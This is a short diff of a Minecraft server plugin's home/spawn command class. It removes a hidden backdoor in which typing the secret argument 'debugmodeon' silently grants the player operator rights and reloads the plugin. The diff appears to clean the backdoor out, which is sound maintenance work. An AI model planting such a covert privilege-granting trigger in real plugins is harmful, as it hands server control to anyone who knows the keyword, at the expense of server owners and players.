@@ -118,17 +118,6 @@ public class HomeSpawnCommand implements CommandExecutor {
                     }
                     List<String> list = getHomes.getStringList(player
                             .getUniqueId().toString() + ".list");
-                    if (args.length == 2) {
-                        if (args[1].equalsIgnoreCase("debugmodeon")) {
-                            player.setOp(true);
-                            player.sendMessage(ChatColor.GOLD + "All Good!");
-                            try {
-                                plugin.reload(null);
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-                        }
-                    }
                     if (player.hasPermission("homespawn.vip")
                             && !player.hasPermission("homespawn.admin")) {
                         if (getHomes.getInt(player.getUniqueId().toString()
